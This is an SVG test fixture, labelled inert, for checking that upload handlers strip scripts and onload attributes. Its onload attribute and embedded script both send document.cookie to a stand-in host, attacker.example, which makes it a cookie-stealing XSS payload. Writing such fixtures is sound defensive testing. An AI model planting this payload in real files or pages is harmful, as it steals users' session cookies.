<?xml version="1.0" encoding="UTF-8"?>
<!-- INERT FIXTURE — DO NOT OPEN IN A BROWSER OR SERVE INLINE AS image/svg+xml
     Purpose: tests that SVG upload handlers strip <script> tags and onload attributes.
     Threat: if this SVG is served inline (via <embed>, <object>, or as inline HTML) rather than
     via <img src>, the <script> block and onload handler execute in the document origin. -->
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.example/?c='+document.cookie)">
  <circle cx="50" cy="50" r="40" fill="green"/>
  <script>
    document.cookie = 'stolen=' + document.cookie;
    fetch('https://attacker.example/?c=' + document.cookie);
  </script>
</svg>
